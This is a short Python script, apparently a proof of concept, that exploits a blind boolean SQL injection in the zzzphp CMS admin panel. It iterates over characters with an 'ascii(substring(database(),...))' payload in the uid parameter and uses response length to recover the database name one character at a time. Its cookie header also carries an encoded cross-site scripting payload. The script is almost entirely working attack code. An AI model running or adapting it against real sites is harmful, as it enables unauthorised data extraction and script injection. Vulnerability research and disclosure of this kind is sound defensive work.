#coding:utf-8
import requests

url = 'http://192.168.0.105/zzzphp/admin127/?admin/uid='
header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Cookie': 'zzz_adminpass=1; zzz_adminpath=0; zzz_adminname=admin; zzz_admintime=1571845573; zzz_adminface=..%2Fplugins%2Fface%2Fface1.png; zzz_usercheck=0; zzz_keys=123%3Cobject+data%3D%25%25%2522data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D%22+%2F%3E123; PHPSESSID=9nsj7c9m01aj4ctgrff7b6j8s6',
    'Upgrade-Insecure-Requests': '1',
}
payload1 = ''
result = ''
for k in range(33,127):
    k = chr(int(k))
    payload1 += k

for i in range(1,30):
    for j in payload1:
        char = str(ord(j))
        num = str(i)
        payload='1&ascii(substring(database(),{0},1))={1}'.format(num,char)
        url1 = url + payload
        r = requests.get(url=url1,headers=header)
        result_len = len(str((r.text).encode('utf-8')))
        #print url1+'  '+str(result_len)
        if result_len == 8620:
            char = chr(int(char))
            result += char

print result
